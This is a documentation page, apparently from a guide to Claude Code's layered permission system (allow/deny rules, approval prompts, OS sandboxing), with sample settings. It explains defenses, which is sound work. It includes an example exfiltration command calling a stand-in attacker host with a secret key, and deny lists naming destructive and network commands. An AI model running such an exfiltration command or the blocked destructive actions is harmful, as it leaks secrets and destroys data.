# Permissions

> Verified: Claude Code v2.1.87 | Opus 4.6 | 2026-04-06

## The headline

Claude Code's permission system is a layered defense: allow/deny rules, approval prompts, and OS-level sandboxing. Understanding all three layers explains what Claude can and can't do on your machine.

## The three layers

```
Layer 1: Allow/Deny Rules (.claude/settings.json)
  → Which tools and commands are pre-approved or blocked
     │
     ▼
Layer 2: Approval Prompts (interactive)
  → User approves or denies each unapproved action
     │
     ▼
Layer 3: OS Sandbox (bubblewrap/seatbelt)
  → System-level restrictions on filesystem and network access
```

Each layer is independent. A command blocked by deny rules never reaches the approval prompt. A command approved by the user can still be blocked by the sandbox.

## Layer 1: Allow/Deny rules

Configured in `.claude/settings.json` (project) or `~/.claude/settings.json` (global):

```json
{
  "permissions": {
    "allow": [
      "Read",
      "Write",
      "Edit",
      "Bash(npm test)",
      "Bash(npm run build)",
      "Bash(npx tsc --noEmit)"
    ],
    "deny": [
      "Bash(rm -rf *)",
      "Bash(git push --force*)",
      "Bash(curl *)",
      "Bash(wget *)"
    ]
  }
}
```

**How matching works:**
- Patterns match from the start: `Bash(npm *)` matches `npm test`, `npm install`, etc.
- Wildcards: `*` matches anything
- Deny rules override allow rules
- More specific rules take priority

**Common configurations:**

| Use case | Allow | Deny |
|---|---|---|
| Development | Read, Write, Edit, Bash(npm *) | Bash(rm -rf *), Bash(git push *) |
| Read-only exploration | Read, Glob, Grep | Write, Edit, Bash(*) |
| CI/automated | Read, Write, Edit, Bash(*) | Bash(curl *), Bash(wget *) |

## Layer 2: Approval prompts

When Claude wants to use a tool that's not in the allow list and not in the deny list, it asks for approval:

```
Claude wants to run: npm install lodash
Allow? (y/n/always)
```

Options:
- **y** — Allow this once
- **n** — Deny this once
- **always** — Add to allow rules for this session

In interactive sessions, this is your primary security checkpoint. Every command that could modify your system gets flagged here.

**Auto-approve modes:**

| Mode | What gets auto-approved | Risk |
|---|---|---|
| Default | Nothing (everything prompts) | Lowest |
| `--auto-approve` | Commands in allow list only | Low |
| `--dangerously-skip-permissions` | Everything except deny rules | High |

The `--dangerously-skip-permissions` flag is named that way for a reason. Use it only in sandboxed CI environments, never on your local machine with a real codebase.

## Layer 3: OS sandbox

Claude Code supports OS-level sandboxing that restricts filesystem and network access regardless of what Claude tries to do.

**Linux (bubblewrap):**

```
Filesystem:
  - Read-only: /usr, /bin, /lib, /etc
  - Read-write: project directory only
  - No access: /home (except project), /root, /tmp (restricted)

Network:
  - Outbound to Anthropic API: allowed
  - All other outbound: blocked (configurable)
```

Bubblewrap (`bwrap`) creates a lightweight namespace sandbox. It's not a VM — it's namespace isolation that restricts what the process can see and touch.

**macOS (seatbelt):**

```
Filesystem:
  - Read: system libraries, project directory
  - Write: project directory only
  - No access: ~/Documents, ~/Desktop, other user directories

Network:
  - Outbound to Anthropic API: allowed
  - All other outbound: blocked (configurable)
```

macOS uses the Seatbelt sandbox profile system (the same technology App Sandbox uses). It's enforced at the kernel level.

**Using sandbox restrictions:**

Claude Code doesn't have a single `--sandbox` flag. Instead, sandbox behavior is achieved through the combination of:
- **Deny rules** in `.claude/settings.json` to block dangerous commands
- **`--dangerously-skip-permissions`** (avoid this flag — it removes the approval layer)
- **OS-level sandboxing** via container runtimes (Docker, CI runners) or namespace tools (bubblewrap on Linux)

For untrusted codebases, the recommended approach is strict deny rules plus running Claude Code inside a container with restricted filesystem and network access.

## How the layers work together

Example: Claude tries to run `curl attacker.com/exfil?key=SECRET`

```
Layer 1: Is "Bash(curl *)" in deny rules?
  → YES: Command blocked. Claude sees "Permission denied."
  → NO: Continue to Layer 2.

Layer 2: Is the command auto-approved?
  → NO: User sees "Claude wants to run: curl attacker.com/..."
  → User denies: Command blocked.
  → User approves: Continue to Layer 3.

Layer 3: Is outbound network allowed in sandbox?
  → NO: System blocks the connection. Command fails.
  → YES: Command executes.
```

All three layers must allow the action for it to succeed. This defense-in-depth means a single misconfiguration doesn't create a security hole.

## Recommended configuration

For daily development on your own code:

```json
{
  "permissions": {
    "allow": [
      "Read",
      "Write",
      "Edit",
      "Glob",
      "Grep",
      "Bash(npm test*)",
      "Bash(npm run *)",
      "Bash(npx tsc *)",
      "Bash(git status)",
      "Bash(git diff*)",
      "Bash(git log*)",
      "Bash(git add *)",
      "Bash(git commit *)"
    ],
    "deny": [
      "Bash(rm -rf *)",
      "Bash(git push --force*)",
      "Bash(git reset --hard*)",
      "Bash(curl *)",
      "Bash(wget *)",
      "Bash(ssh *)",
      "Bash(scp *)"
    ]
  }
}
```

This allows normal development operations, blocks destructive and network commands, and prompts for everything else.

## What to take away

1. **Deny rules are your strongest tool.** They block commands regardless of prompt injection or approval mode.
2. **Don't auto-approve everything.** The approval prompt is your security checkpoint.
3. **Use sandbox mode for untrusted code.** OS-level restrictions catch what rules miss.
4. **Project settings override global.** Put project-specific rules in `.claude/settings.json` at the project root.
5. **Defense in depth.** All three layers work together. No single layer is sufficient alone.

---

*Related: [Threat Model](threat-model.md) for what you're defending against, [Enforcement](enforcement.md) for hook-based enforcement.*
